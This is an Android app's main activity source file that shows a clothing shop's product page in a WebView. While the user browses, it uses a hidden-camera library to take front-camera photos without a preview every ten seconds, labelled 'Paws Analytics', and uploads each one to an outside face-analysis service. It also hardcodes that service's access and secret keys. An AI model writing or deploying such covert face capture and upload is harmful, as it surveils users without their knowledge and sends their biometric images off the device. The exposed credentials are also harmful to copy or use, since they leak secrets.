package fen.code.digitalsurau;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.CameraError;
import com.androidhiddencamera.HiddenCameraActivity;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraFocus;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.androidhiddencamera.config.CameraRotation;
import com.google.gson.JsonObject;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;

import java.io.File;

public class MainActivity extends HiddenCameraActivity {
    private static final int REQ_CODE_CAMERA_PERMISSION = 1253;

    private CameraConfig mCameraConfig;
    private WebView mWebView;

    boolean isActive;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mCameraConfig = new CameraConfig()
                .getBuilder(this)
                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                .setImageRotation(CameraRotation.ROTATION_270)
                .setCameraFocus(CameraFocus.AUTO)
                .build();

        initPermission();

        //Take a picture
        findViewById(R.id.capture_btn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //Take picture using the camera without preview.
                takePicture();
            }
        });

        mWebView = findViewById(R.id.web_view);
        initWebView();

        initPaws();
    }

    private Handler handler = new Handler();
    private Runnable runnable = new Runnable() {
        @Override
        public void run() {
            runPaws();
            if (isActive)
                handler.postDelayed(this, 10000);
        }
    };

    private void initPaws() {
        Log.d(getClass().getSimpleName(), "Paws: initPaws: Initiated");

        isActive = true;
        handler.postDelayed(runnable, 10000);
    }

    private void runPaws() {
        Log.d(getClass().getSimpleName(), "Paws: runPaws: Running");

        // HERE: Paws Analytics
        takePicture();
    }

    @Override
    protected void onStop() {
        super.onStop();
        stopCamera();
        isActive = false;
    }

    @Override
    public void onPause() {
        super.onPause();
        stopCamera();
        isActive = false;
    }

    @Override
    public void onResume() {
        super.onResume();
        isActive = true;

        initPermission();
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void initWebView() {
        Log.d(getClass().getSimpleName(), "Paws: initWebView: Initiated");
        // Enable Javascript
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);

        mWebView.setWebViewClient(new WebViewClient() {
            //If you will not use this method url links are open in new browser not in webview
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            public void onPageFinished(WebView view, String url) {
            }
        });
        mWebView.loadUrl("https://www.debusana.com/new-products");
    }

    @SuppressLint("MissingPermission")
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        if (requestCode == REQ_CODE_CAMERA_PERMISSION) {

            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startCamera(mCameraConfig);
            } else {
                Log.d(getClass().getSimpleName(), getString(R.string.error_camera_permission_denied));
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {

        // Convert file to bitmap.
        // Do something.
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.RGB_565;
        Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);

        Log.d(getClass().getSimpleName(), "Paws: onImageCapture: " + imageFile.getAbsolutePath());
        //Display the image to the image view
        ((ImageView) findViewById(R.id.cam_prev)).setImageBitmap(bitmap);

        sendData(imageFile);
    }

    private void sendData(File file) {
        Log.d(getClass().getSimpleName(), "Paws: sendData: Initiated");

        // Enable global Ion logging
        Ion.getDefault(getApplicationContext()).configure().setLogging("Paws Ion", Log.DEBUG);
        Ion.getDefault(getApplicationContext()).configure().getResponseCache().setCaching(false);

        Ion.with(getApplicationContext())
                .load("POST", "https://face.recoqnitics.com/analyze")
                .addHeader("Content-Type", "application/json")
                .addQuery("access_key", "2f59d21b9433edb14b48")
                .addQuery("secret_key", "d4da3007a94e8acd6adc5631885d406e79549deb")
                .setMultipartParameter("filename", "filename")
                .setMultipartFile("filename", "application/", file)
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception e, JsonObject result) {
                        Log.d(getClass().getSimpleName(), "Paws: sendData: " + result);

                    }
                });
    }

    @Override
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        switch (errorCode) {
            case CameraError.ERROR_CAMERA_OPEN_FAILED:
                //Camera open failed. Probably because another application
                //is using the camera
                Log.d(getClass().getSimpleName(), getString(R.string.error_cannot_open));
                break;
            case CameraError.ERROR_IMAGE_WRITE_FAILED:
                //Image write failed. Please check if you have provided WRITE_EXTERNAL_STORAGE permission
                Log.d(getClass().getSimpleName(), getString(R.string.error_cannot_write));
                break;
            case CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE:
                //camera permission is not available
                //Ask for the camera permission before initializing it.
                Log.d(getClass().getSimpleName(), getString(R.string.error_cannot_get_permission));
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION:
                //Display information dialog to the user with steps to grant "Draw over other app"
                //permission for the app.
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA:
                Log.d(getClass().getSimpleName(), getString(R.string.error_not_having_camera));
                break;
        }
    }

    private void initPermission() {
        Log.d(getClass().getSimpleName(), "Paws: initPermission: Initiated");
        //Check for the camera permission for the runtime
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {

            //Start camera preview
            startCamera(mCameraConfig);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA},
                    REQ_CODE_CAMERA_PERMISSION);
        }
    }
}
